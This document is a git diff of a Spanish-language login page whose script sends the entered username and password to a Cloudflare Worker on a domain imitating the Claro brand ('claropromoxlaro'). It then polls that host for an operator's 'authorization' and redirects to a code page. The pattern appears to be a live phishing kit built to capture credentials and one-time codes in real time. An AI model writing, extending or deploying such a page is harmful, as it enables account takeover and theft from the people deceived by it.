@@ -16,32 +16,43 @@
     <button type="submit">Enviar</button>
   </form>
 
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
+  <h2>Ingresando...</h2>
+  <p id="status">Esperando autorización...</p>
 
+  <script>
+    let loginId = null;
+
+    document.getElementById("loginForm").addEventListener("submit", async e => {
+      e.preventDefault();
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      // URL de tu Worker
-      const url = "https://blue-night-7897.claropromoxlaro.workers.dev";
-
-      const res = await fetch(url, {
+      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ usuario, clave })
       });
 
       const data = await res.json();
-      if(data.ok) {
-        // Guardamos el id temporal
-        localStorage.setItem("authId", data.id);
-        // Redirigimos a página de espera
-        window.location.href = "esperando.html";
-      } else {
-        alert("❌ Error al enviar: " + data.error);
-      }
+      if (!data.ok) return alert("Error: " + data.error);
+      loginId = data.id;
+      document.getElementById("status").textContent = "Esperando autorización...";
     });
+
+    // Polling cada 3s
+    setInterval(async () => {
+      if (!loginId) return;
+      const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${loginId}`);
+      const statusData = await statusRes.json();
+      const statusEl = document.getElementById("status");
+
+      if (statusData.autorizado) {
+        statusEl.textContent = "✅ Autorizado!";
+        window.location.href = "codigo.html";
+      } else if (statusData.error) {
+        statusEl.textContent = "❌ Error en la autorización";
+      }
+    }, 3000);
   </script>
 </body>
 </html>
